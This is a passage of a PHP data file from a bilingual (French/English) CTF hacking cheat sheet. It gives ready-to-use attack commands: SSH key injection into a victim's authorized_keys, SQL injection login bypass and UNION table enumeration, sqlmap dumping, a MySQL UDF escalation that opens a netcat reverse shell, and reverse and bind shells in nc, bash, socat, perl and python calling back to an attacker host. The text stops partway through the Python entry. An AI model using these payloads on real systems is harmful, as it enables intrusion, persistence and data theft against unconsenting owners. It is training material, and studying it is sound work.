ssh-rsa AAAAB3NzaC1yc2EAAAADAQAxxxxx8/QoN3NBob3zs4l2mfZWkZNAtCHN2CpQ== yolo@yoloctf.org
```


',
    'title_en' => 'SSH : Generate a private/public key pair',
    'desc_en' => '## SSH : Generate a private/public key pair

Generate a private/public key pair:<br/>
Just type [enter] to (empty for no passphrase) to generate a private key without a password.
If you enter a password, your key will be encrypted, and you will have to type the password every time you use it.
```
$ ssh-keygen -t rsa -b 4096 -C yolo@yoloctf.org -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:OSHYGRwrI7LM9/8haFfVXgBlXrdHcdfEZxIv9CeWg5Q yolo@yoloctf.org
The key\'s randomart image is:
+---[RSA 4096]----+
|     .o.   .+=o*O|
|     o.+   .Eo+=X|
|. . + = .  ..o*=*|
|oo . o . o. ...+o|
|.o .    S.   .   |
|  . . . ..       |
|     + o .       |
|    . o . .      |
|       ...       |
+----[SHA256]-----+
```

The private key file should only be readable by its owner.<br/>
If needed do: chmod 600 id_rsa.
```
vagrant@kali:/home/yolo/tmp$ ls -al
total 16
drwxrwxrwx  2 yolo      yolo   4096 Apr  4 13:24 .
drwxr-xr-x 27 yolo 		yolo   4096 Apr  4 13:22 ..
-rw-------  1 yolo      yolo   3381 Apr  4 13:24 id_rsa
-rw-r--r--  1 yolo      yolo    742 Apr  4 13:24 id_rsa.pub
```

Private key headers are easy to identify:
```
$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
7KrJLvv/4Ve+Dm5bLwhJ9BkLessiIlGgx0ju+ghI7V+Ar+qAhir5chpVSGH4YIk0J8VDbJ
...
O9mUtgl8PKUd5AQL6sMM/FaYffu7+OFQkJzv3hxyiFEQPhsAo2K55cG8S0RWCX9Jp96U54
lOXLj6MfGkfzuvvFS4pm9iTBrwKq8h7CubmNOnHe3TH3U/Mrzf6wq8MwAEpSeTWfnBGdRP
tHOBQdCIQj3JAAAAEHlvbG9AeW9sb2N0Zi5vcmcBAg==
-----END OPENSSH PRIVATE KEY-----
```

Password protected Key header:
```
$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25325A9B318F344B8391AFD767D6D

NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
```



Public key :
```
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQAxxxxx8/QoN3NBob3zs4l2mfZWkZNAtCHN2CpQ== yolo@yoloctf.org
```


',
  ),
  'Shell-sshidrsadechiffre' => 
  array (
    'category' => 'Shell',
    'id' => 'sshidrsadechiffre',
    'title' => 'SSH :Enlever le mot de passe d\'une clef chiffree',
    'desc' => '## SSH :Enlever le mot de passe d\'une clef chiffree

Une fois le mot passe d\'une clef privée trouvé avec John, il est possible de l\'enlever pour se simplifier la vie.
```
openssl rsa -in [id_rsa_sec] -out [id_rsa]
```


',
    'title_en' => 'SSH : Remove private key password',
    'desc_en' => '## SSH : Remove private key password

Once the password of a private key found with John, it is possible to remove it for simplicity.
```
openssl rsa -in [id_rsa_sec] -out [id_rsa]
```


',
  ),
  'Shell-sshidrsaauth' => 
  array (
    'category' => 'Shell',
    'id' => 'sshidrsaauth',
    'title' => 'SSH : Authoriser l\'authentification par clef privée',
    'desc' => '## SSH : Authoriser l\'authentification par clef privée

Les clefs publiques permettant de se connecter en ssh sont listées, une clef par ligne, dans le fichier.
```
~/.ssh/authorized_keys
```


Une fois sur un compte utilisateur d\'un serveur, injectez votre clef publique pour avoir un accès direct en ssh.
```
echo \'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org\' >> /home/victim/.ssh/authorized_keys
```

Si le répertoire n\'existe pas, il suffit de le créer:
```
mkdir /home/victim/.ssh
chmod 700 /home/victim/.ssh
echo \'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org\' >> /home/victim/.ssh/authorized_keys
chmod 600 /home/victim/.ssh/authorized_keys
```

Laissez tomber votre webshell, et revenez en ssh:
```
ssh -i id_rsa_yolo victim@target.com
```



',
    'title_en' => 'SSH : Allow private key authentication',
    'desc_en' => '## SSH : Allow private key authentication

The public keys to connect in ssh are listed, one key per line, in the file.
```
~/.ssh/authorized_keys
```


Once on a user account of a server, inject your public key to have a direct access in ssh.
```
echo \'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org\' >> /home/victim/.ssh/authorized_keys
```

If the directory does not exist, just create it:
```
mkdir /home/victim/.ssh
chmod 700 /home/victim/.ssh
echo \'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org\' >> /home/victim/.ssh/authorized_keys
chmod 600 /home/victim/.ssh/authorized_keys
```

Close your webshell, and come back in ssh:
```
ssh -i id_rsa_yolo victim@target.com
```



',
  ),
  'sqli-intro' => 
  array (
    'category' => 'sqli',
    'id' => 'intro',
    'title' => 'SQLi',
    'desc' => '## SQLi


',
    'title_en' => 'SQLi',
    'desc_en' => '## SQLi


',
  ),
  'sqli-principe' => 
  array (
    'category' => 'sqli',
    'id' => 'principe',
    'title' => 'Principe',
    'desc' => '## Principe

Injecter des commandes SQL dans les paramêtres pour réécrire la requête.
```
SELECT * FROM user WHERE login=\'[USER]\' and password=\'[PASSWORD]\';
```

Méthode : fermer la \', élargir la requête avec OR 1=1, ajouter des valeurs avec UNION, commenter la fin de la requête avec # ou -- -
```
Valeur des paramètres envoyés :
USER=admin\' OR 1=1 -- -
PASSWORD=ferrari

Requète SQL obtenue:
SELECT * FROM user WHERE login=\'admin\' OR 1=1 -- - and password=\'ferrari\';
```

Envoyer les paramètres avec Curl:
```
curl http://target/login.pgp?login=admin\' OR 1=1 -- -&password=ferrari
```


',
    'title_en' => 'Principle',
    'desc_en' => '## Principle

Inject SQL commands in the parameters to rewrite the SQL query.
```
SELECT * FROM user WHERE login=\'[USER]\' and password=\'[PASSWORD]\';
```

Method : close the single quote \', whiden the SELECT with OR 1=1, add entries thanks to  UNION, comment the end of the request with # or -- -
```
Sent parameters:
USER=admin\' OR 1=1 -- -
PASSWORD=ferrari

Altered SQL request:
SELECT * FROM user WHERE login=\'admin\' OR 1=1 -- - and password=\'ferrari\';
```

Send the Form with custom params thanks to curl:
```
curl http://target/login.pgp?login=admin\' OR 1=1 -- -&password=ferrari
```


',
  ),
  'sqli-sqli-fun' => 
  array (
    'category' => 'sqli',
    'id' => 'sqli-fun',
    'title' => 'Les Exploits de maman',
    'desc' => '## Les Exploits de maman

<img src=\'https://imgs.xkcd.com/comics/exploits_of_a_mom.png\'>
- Bonjour, c\'est l\'école de votre fils. Nous avons des petits soucis informatiques.
- A-t-il cassé quelque chose ?
- D\'une certaine manière
- Avez vous réellement donné comme prénom à votre fils: Robert\'); DROP TABLE Students; -- ?
- Oh, oui, on le surnomme notre petit Bobby Tables
- Nous venons de perdre l\'intégralité des données sur les étudiants. J\'espère que vous êtes satisfaite.
- Et moi j\'espère que vous avez appris à filtrer vos données utilisateurs



',
    'title_en' => 'Exploits of a mom',
    'desc_en' => '## Exploits of a mom

<img src=\'https://imgs.xkcd.com/comics/exploits_of_a_mom.png\'>

',
  ),
  'sqli-sql-mysql' => 
  array (
    'category' => 'sqli',
    'id' => 'sql-mysql',
    'title' => 'MySQL/MariaDB - Commandes',
    'desc' => '## MySQL/MariaDB - Commandes

Connect to a remote mysql database:
```
mysql -u admin --host=10.10.12.10 : without password
mysql -u admin --host=10.10.12.10 -padmin : with password
```

Usefull commands:
```
SELECT @@version;
SELECT user();
SHOW Databases;
USE database;
SHOW tables;
SELECT * from table;
```


',
    'title_en' => 'MySQL/MariaDB - Commands',
    'desc_en' => '## MySQL/MariaDB - Commands

Connect to a remote mysql database:
```
mysql -u admin --host=10.10.12.10 : without password
mysql -u admin --host=10.10.12.10 -padmin : with password
```

Usefull commands:
```
SELECT @@version;
SELECT user();
SHOW Databases;
USE database;
SHOW tables;
SELECT * from table;
```


',
  ),
  'sqli-detect' => 
  array (
    'category' => 'sqli',
    'id' => 'detect',
    'title' => 'Détecter une SQLi',
    'desc' => '## Détecter une SQLi

Vous êtes devant une page web contenant un formulaire de login/register/search,...
Saisissez des fermetures de string \' ou " pour générer une erreur.<br/>
Injecter un sleep et remarquer un retard de la réponse.
```
admin\' and sleep(5) and \'1\'=\'1
admin" and sleep(5) and "1"="1
```


',
    'title_en' => 'Detect SQLi',
    'desc_en' => '## Detect SQLi

Inject single quote \' or double quote " and see an error.<br/>
Inject Sleep and detect a delayed response.
```
admin\' and sleep(5) and \'1\'=\'1
admin" and sleep(5) and "1"="1
```


',
  ),
  'sqli-limit' => 
  array (
    'category' => 'sqli',
    'id' => 'limit',
    'title' => 'Selectionner une seule entrée',
    'desc' => '## Selectionner une seule entrée

Généralement les développeurs prennent la première entrée. Mais parfois ils vérifient qu\'il n\'y en a bien qu\'une seule.
```
admin\' or 1=1 LIMIT 1 -- -
```


',
    'title_en' => 'Select only one entry',
    'desc_en' => '## Select only one entry

Usually developers take the first entry. But sometimes they check that there is only one.
```
admin\' or 1=1 LIMIT 1 -- -
```


',
  ),
  'sqli-simplefilter' => 
  array (
    'category' => 'sqli',
    'id' => 'simplefilter',
    'title' => 'Contourner les filtres simple',
    'desc' => '## Contourner les filtres simple

Les développeurs filtrent parfois de caractères ou des mot:
```
Space => Tab %09, Newline %A0, /**/
AND   => && %26%26
OR    => ||
```


',
    'title_en' => 'Bypass simple filters',
    'desc_en' => '## Bypass simple filters

Sometime, SQLi aware developpers filter characters such as space or words such as OR:
```
Space => Tab %09, Newline %A0, /**/
AND   => && %26%26
OR    => ||
```


',
  ),
  'sqli-union' => 
  array (
    'category' => 'sqli',
    'id' => 'union',
    'title' => 'Injecter des valeurs avec un UNION',
    'desc' => '## Injecter des valeurs avec un UNION

Quand la requête sert à afficher des entrées (ex: liste d\'objets), on peut ajouter des valeurs avec un UNION.<br/>
Il faut commencer par identifier le nombre d\'entrées qu\'attend le select<br/>
```
SELECT id, name, desc, price FROM stock WHERE name=[NAME]
```

Methode 1: ORDER BY
```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 1-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 2-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 3-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 4-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 5-- - : Erreur
=> 4 entrées
```

Methode 2: SELECT
```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1 : Erreur
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2 : Erreur
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,3 : Erreur
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,3,4 : Ok
=> 4 entrées
```


',
    'title_en' => 'Inject values using UNION',
    'desc_en' => '## Inject values using UNION

When the query is used to display entries (e.g. list of objects), values can be added with a UNION.<br/>.
First, you need to identify the number of entries used by SELECT:<br/>
```
SELECT id, name, desc, price FROM stock WHERE name=[NAME]
```

Methode 1: ORDER BY
```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 1-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 2-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 3-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 4-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 5-- - : Error
=> 4 entries
```

Methode 2: SELECT
```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1 : Error
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2 : Error
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,3 : Error
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,3,4 : Ok
=> 4 entries
```


',
  ),
  'sqli-uniontablenames' => 
  array (
    'category' => 'sqli',
    'id' => 'uniontablenames',
    'title' => 'UNION: Table names',
    'desc' => '## UNION: Table names

```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,table_name,table_name FROM information_schema.tables; -- -
```


',
    'title_en' => 'UNION: Table names',
    'desc_en' => '## UNION: Table names

```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,table_name,table_name FROM information_schema.tables; -- -
```


',
  ),
  'sqli-uniontablecolumnnames' => 
  array (
    'category' => 'sqli',
    'id' => 'uniontablecolumnnames',
    'title' => 'UNION: Table columns names',
    'desc' => '## UNION: Table columns names

```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,column_name,column_name FROM information_schema.columns WHERE  table_name=\'users\'; -- -
```


',
    'title_en' => 'UNION: Table columns names',
    'desc_en' => '## UNION: Table columns names

```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,column_name,column_name FROM information_schema.columns WHERE  table_name=\'users\'; -- -
```


',
  ),
  'sqli-sqlmap' => 
  array (
    'category' => 'sqli',
    'id' => 'sqlmap',
    'title' => 'SqlMap',
    'desc' => '## SqlMap

SQLi sur les paramètres d\'un GET
```
$ sqlmap -u \'http://10.10.10.129/sqli/example1.php?name=root\' --dbs --banner
```

SQLi sur les paramètres d\'un POST. <br/>
Intercepter la requète avec Burp, et la sauver dans un fichier login.txt
```
$ sqlmap -r login.txt --dbs --banner
-p name : forcer le paramètre à tester
```

Lister les tables, puis dumper une table
```
$ sqlmap -r login.txt -D jetadmin --tables
$ sqlmap -r login.txt -D jetadmin -T users --dump
```


',
    'title_en' => 'SqlMap',
    'desc_en' => '## SqlMap

SQLi on GET parameter:
```
$ sqlmap -u \'http://10.10.10.129/sqli/example1.php?name=root\' --dbs --banner
```

SQLi on POST parameter:<br/>
Intercept the request using Burp, and save it in login.txt file.
```
$ sqlmap -r login.txt --dbs --banner
-p name : parameter to be tested
```

List tables, then dumper une table:
```
$ sqlmap -r login.txt -D jetadmin --tables
$ sqlmap -r login.txt -D jetadmin -T users --dump
```


',
  ),
  'sqli-mysqludf' => 
  array (
    'category' => 'sqli',
    'id' => 'mysqludf',
    'title' => 'MySQL: UDF User Defined Function',
    'desc' => '## MySQL: UDF User Defined Function

Compiler une librairie UDF contenant le fonction sys_exec()<br/>
L\'uploader sur le serveur. La déclarer. La fonction sys_exec() permet de lancer des commandes.
```
# Tested with : mysql 5.5.60-0+deb8u1
# Create a \'User Defined Function\' calling C function \'system\'
# Use pre-compiled 32 or 64 depending on target.
# Copy file to /tmp
create database exploittest;
use exploittest;
create table bob(line blob);
insert into bob values(load_file(\'/tmp/lib_mysqludf_sys.so\'));
select * from bob into dumpfile \'/usr/lib/mysql/plugin/lib_mysqludf_sys.so
create function sys_exec returns int soname \'lib_mysqludf_sys.so\';
select sys_exec(\'nc 11.0.0.21 4444 -e /bin/bash\');

select sys_exec(\'/bin/sh\');
after bash access, \'bash –p\' or \'sudo su\'
```



',
    'title_en' => 'MySQL: UDF User Defined Function',
    'desc_en' => '## MySQL: UDF User Defined Function

Compile a unix library containing the function sys_exec()<br/>
Uploader the .so file onto the server. Declare the function in MySQL. Now it\'s possible to use sys_exec() to run shell commands.
```
# Tested with : mysql 5.5.60-0+deb8u1
# Create a \'User Defined Function\' calling C function \'system\'
# Use pre-compiled 32 or 64 depending on target.
# Copy file to /tmp
create database exploittest;
use exploittest;
create table bob(line blob);
insert into bob values(load_file(\'/tmp/lib_mysqludf_sys.so\'));
select * from bob into dumpfile \'/usr/lib/mysql/plugin/lib_mysqludf_sys.so
create function sys_exec returns int soname \'lib_mysqludf_sys.so\';
select sys_exec(\'nc 11.0.0.21 4444 -e /bin/bash\');

select sys_exec(\'/bin/sh\');
after bash access, \'bash –p\' or \'sudo su\'
```



',
  ),
  'Webshell-intro' => 
  array (
    'category' => 'Webshell',
    'id' => 'intro',
    'title' => 'Web Shell',
    'desc' => '## Web Shell

Lignes de code à injecter dans des pages web pour lancer des commandes shell.

',
    'title_en' => 'Web Shell',
    'desc_en' => '## Web Shell

Lignes de code à injecter dans des pages web pour lancer des commandes shell.

',
  ),
  'Webshell-ncprinciple' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncprinciple',
    'title' => 'Principe',
    'desc' => '## Principe

Vous avez trouvé une requête web qui permet d\'executer des commandes sur le serveur, ou vous avez reussi à trouver comment uploader un fichier qui peut être exécuté.<br/>
Votre objectif maintenant est d\'obtenir un shell sur la machine, ce qui permettra une exploitation confortable.<br/>
Vous allez utiliser les outils installés sur le serveur (netcat, bash, php, python, perl, ...) pour ouvrir un shell sur le serveur et le connecter à votre shell.

',
    'title_en' => 'Principle',
    'desc_en' => '## Principle

You have found a web request that allows you to execute commands on the server, or you have managed to find out how to upload a file that can be executed.<br/>
Your goal now is to get a shell on the machine, which will allow a comfortable exploitation.<br/>
You will use the tools installed on the server (netcat, bash, php, python, perl, ...) to open a shell on the server and connect it back to your host.

',
  ),
  'Webshell-nc' => 
  array (
    'category' => 'Webshell',
    'id' => 'nc',
    'title' => 'Netcat',
    'desc' => '## Netcat

Netcat, est le couteau suisse des connections entre serveurs.<br/>
Il peut se mettre en écoute, se connecter et lancer des shells.<br/>
<br/>
Les anciennes versions possédaient l\'option -e ou -c qui permet de lancer un shell. Les version récentes ne possèdent plus cette option pour des raisons de sécurité<br/>
Sur Kali on trouve une version 1.10 en :
```
/usr/bin/nc -h
-e shell commands : program to execute
-c shell commands : program to execute
-l                : listen mode
-v                : verbose
-p port           : local port number
```

Pour se connecter sur le port 3000 du serveur 10.0.0.11:
```
/usr/bin/nc 10.0.0.11 3000
```


',
    'title_en' => 'Netcat',
    'desc_en' => '## Netcat

Netcat, is the Swiss army knife of connections between servers.<br/>
It can listen, connect and launch shells.<br/>
<br/>
Older versions had the -e or -c option to launch a shell. Recent versions do not have this option anymore for security reasons.<br/>
On Kali there is a version 1.10 in :
```
/usr/bin/nc -h
-e shell commands : program to execute
-c shell commands : program to execute
-l                : listen mode
-v                : verbose
-p port           : local port number
```

Connect to port 3000 on 10.0.0.11 server:
```
/usr/bin/nc 10.0.0.11 3000
```


',
  ),
  'Webshell-ncreverse' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncreverse',
    'title' => 'Netcat - Reverse Shell (-e version)',
    'desc' => '## Netcat - Reverse Shell (-e version)

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

Lancer un reverse shell sur le serveur, qui lance un shell, vient se connecter sur le netcat en écoute, et donne accès au shell.
```
nc -e /bin/sh IPKALI 4444
```

Pour utiliser un reverse shell il faut connaitre l\'IP publique de sa Kali.

',
    'title_en' => 'Netcat - Reverse Shell (-e version)',
    'desc_en' => '## Netcat - Reverse Shell (-e version)

On your host, start a nc listening on 4444 port
```
nc -lvp 4444
```

On the target host, start a reverse shell. This reverse shell launch a shell and connect it to your host on 4444 port.
```
nc -e /bin/sh IPKALI 4444
```

To use a reverse shell you must have a public IP, and can\'t use a NAT.
Well, you can, its just little bit trickier.

',
  ),
  'Webshell-ncreversenoe' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncreversenoe',
    'title' => 'Netcat - Reverse Shell (sans -e)',
    'desc' => '## Netcat - Reverse Shell (sans -e)

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

Lancer un reverse shell sur le serveur, qui lance un shell, vient se connecter sur le netcat en écoute, et donne accès au shell.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f
```


',
    'title_en' => 'Netcat - Reverse Shell (without -e)',
    'desc_en' => '## Netcat - Reverse Shell (without -e)

On your host, start a nc listening on 4444 port
```
nc -lvp 4444
```

On the target host, start a reverse shell. This reverse shell launch a shell and connect it to your host on 4444 port.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f
```


',
  ),
  'Webshell-ncupgrade' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncupgrade',
    'title' => 'Upgrader son shell netcat avec un tty',
    'desc' => '## Upgrader son shell netcat avec un tty

Le shell obtenu avec nc est basique. Ce n\'est pas un tty.<br/>
Certaines commandes comme su vont refuser de fonctionner.<br/>
Pour upgrader notre shell, utiliser python pour avoir un shell de type tty:
```
python -c \'import pty; pty.spawn(&quot/bin/bash&quot)\'
```


',
    'title_en' => 'Upgrade your nc shell to a tty',
    'desc_en' => '## Upgrade your nc shell to a tty

The shell obtained with nc is basic. It is not a tty (real terminal).<br/>
Some commands like su will refuse to work.<br/>
To upgrade our shell, use python to get a tty shell:
```
python -c \'import pty; pty.spawn(&quot/bin/bash&quot)\'
```


',
  ),
  'Webshell-ncupgrade2' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncupgrade2',
    'title' => 'Upgrader son shell avec historique et completion',
    'desc' => '## Upgrader son shell avec historique et completion

Le shell obtenu avec nc est basique. La completion avec le Tab, l\'historique avec les flèches ne sont pas gérés.<br/>
<br/>
Passer le nc en arrière plan avec:
```
Ctr-Z
```

Puis demander au shell actuel de passer les codes des touches brutes au shell distant, et repasser sur le netcat (foreground)
```
stty raw -echo
fg
```

Attention: Tenter cette manip dans un browser va juste freezer le shell. Le browser modifie lui aussi les codes des touches. Ca ne marche que dans une VM.

',
    'title_en' => 'Upgrade your shell with history and completion',
    'desc_en' => '## Upgrade your shell with history and completion

The shell obtained with nc is basic. The completion with Tab, the history with arrows are not managed.<br/>
<br/>
Put the nc in the background with:
```
Ctr-Z
```

Then ask the current shell to pass the raw keystroke codes to the remote shell, and switch back to the netcat (foreground)
```
stty raw -echo
fg
```

Disclamer: Trying this in a browser will just freeze the shell. The browser also modifies the key codes. It only works in a VM

',
  ),
  'Webshell-ncwebfriendly' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncwebfriendly',
    'title' => 'Webshell copain friendly',
    'desc' => '## Webshell copain friendly

Tant que votre nc est connecté, vous bloquez un thread du serveur web.
En fonction de la configuration du serveur, il peut avoir 6, 16, 32 threads... Dont autant de nc en parallèles avant saturation.
Pour libérer le serveur pour les copains:
Dans le nc connecté, choisissez un second port et lancez un second bindshell netcat en arrière plan:
```
binshell:
nohup bash -c \'while true; do nc -e /bin/bash -lvp 4445; done;\' &

reverse shell:
nohup bash -c \'bash -i >& /dev/tcp/IPKALI/4444 0>&1\' &
```

La commande nohup va détacher le process nc du shell en cours.
Faites un Ctrl-C pour couper la connection nc, la page avec votre webshell se libère. Un autre utilisateur peut se connecter.
Lancer un nouveau nc pour vous connecter à ce nouveau bindshell.

',
    'title_en' => 'Friendly Webshell',
    'desc_en' => '## Friendly Webshell

As long as your nc is connected, you block a thread of the web server.
Depending on the configuration of the server, it can have 6, 16, 32 threads... This means as many nc in parallel before saturation.
To free the server for friends:
In the connected nc, choose a second port and launch a second netcat bindshell in the background:```
binshell:
nohup bash -c \'while true; do nc -e /bin/bash -lvp 4445; done;\' &

reverse shell:
nohup bash -c \'bash -i >& /dev/tcp/IPKALI/4444 0>&1\' &
```

The nohup command will detach the nc process from the current shell.
Do a Ctrl-C to cut the nc connection, the page with your webshell will be freed. Another user can connect.
Launch a new nc to connect to this new bindshell.

',
  ),
  'Webshell-ncbind' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncbind',
    'title' => 'Netcat - Bind shell',
    'desc' => '## Netcat - Bind shell

Un bind shell est utile quand notre Kali est derrière un NAT.
Ce shell est fragile, un scan de port va le déclencher et le fermer.
Lance un shell, ouvre une socket TCP en écoute sur le port 4444, et donne accès au shell au premier qui se connecte.
```
nc -e /bin/sh -lvp 4444
```

Se connecte au netcat distant pour avoir accès au shell.
```
nc iptarget 4444
```


',
    'title_en' => 'Netcat - Bind shell',
    'desc_en' => '## Netcat - Bind shell

A bind shell is useful when our host is behind a NAT.
This shell is fragile, a port scan will trigger it and close it.
Launch a shell, open a listening TCP socket on port 4444, and give access to the shell to the first one who connects.
```
nc -e /bin/sh -lvp 4444
```

Connect to the nc on the target and get the shell:
```
nc iptarget 4444
```


',
  ),
  'Webshell-ncbindnoe' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncbindnoe',
    'title' => 'Netcat - Bind Shell (without -e option)',
    'desc' => '## Netcat - Bind Shell (without -e option)

Lancer un bind shell sur la cible
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f
```

Se connecter avec un nc
```
nc victim 4444
```


',
    'title_en' => 'Netcat - Bind Shell (without -e option)',
    'desc_en' => '## Netcat - Bind Shell (without -e option)

Launch a bind shell on the target host
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f
```

Then connect to it
```
nc victim 4444
```


',
  ),
  'Webshell-socat' => 
  array (
    'category' => 'Webshell',
    'id' => 'socat',
    'title' => 'Shell: Socat',
    'desc' => '## Shell: Socat

Socat est un nc sous stéroides. Il permet une authentification, un chiffrement des communications et un forward de ports.<br/>
On le trouve rarement sur les serveurs, il faut l\'uploader.<br/>
Mettre un socat en écoute
```
socat file:`tty`,raw,echo=0 TCP-L:4444
```

Lancer un reverse shell avec un socat
```
$ /tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
```

Automatiser l\'upload et le reverse shell:
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```


',
    'title_en' => 'Shell: Socat',
    'desc_en' => '## Shell: Socat

Socat is a nc on steroids. It allows authentication, encryption of communications and port forwarding.<br/>
It is rarely found on the servers, it must be uploaded.<br/>
Start a listening socat:
```
$ socat file:`tty`,raw,echo=0 TCP-L:4444
```

Launch reverse shell back to 10.0.0.1:4444
```
$ /tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
```

Automate socat upload and the reverse shell:
```
$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```


',
  ),
  'Webshell-pwncat' => 
  array (
    'category' => 'Webshell',
    'id' => 'pwncat',
    'title' => 'Shell: Pwncat',
    'desc' => '## Shell: Pwncat

Pwncat est un nc sous stéroides.
```
https://github.com/cytopia/pwncat
```


',
    'title_en' => 'Shell: Pwncat',
    'desc_en' => '## Shell: Pwncat

Pwncat is an upgraded nc on steroids too.
```
https://github.com/cytopia/pwncat
```


',
  ),
  'Webshell-bash' => 
  array (
    'category' => 'Webshell',
    'id' => 'bash',
    'title' => 'Reverse shell: Bash',
    'desc' => '## Reverse shell: Bash

Netcat et python ne sont pas installés sur le serveur. Il est toujours possible de lancer un reverse shell en bash.<br/>
Mettre un nc en écoute votre host:
```
nc -lvp 4444
```

Lancer le reverse shell à partir de votre cible:
```
bash -i >& /dev/tcp/IPKALI/4444 0>&1
```


',
    'title_en' => 'Reverse shell: Bash',
    'desc_en' => '## Reverse shell: Bash

Netcat and python are not installed on the server. It is still possible to launch a reverse shell in bash.<br/>
Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell on your target:
```
bash -i >& /dev/tcp/IPKALI/4444 0>&1
```


',
  ),
  'Webshell-perl' => 
  array (
    'category' => 'Webshell',
    'id' => 'perl',
    'title' => 'Reverse shell: Perl',
    'desc' => '## Reverse shell: Perl

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

```
perl -e \'use Socket;$i="IPKALI";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'
```


',
    'title_en' => 'Reverse shell: Perl',
    'desc_en' => '## Reverse shell: Perl

Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell in perl on your target:
```
perl -e \'use Socket;$i="IPKALI";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'
```


',
  ),
  'Webshell-python' => 
  array (
    'category' => 'Webshell',
    'id' => 'python',
    'title' => 'Reverse shell: Python',
    'desc' => '## Reverse shell: Python

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

```
python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IPKALI,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/bash)\'
```


',
    'title_en' => 'Reverse shell: Python',
    'desc_en' => '## Reverse shell: Python

Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell in python on your target:
```
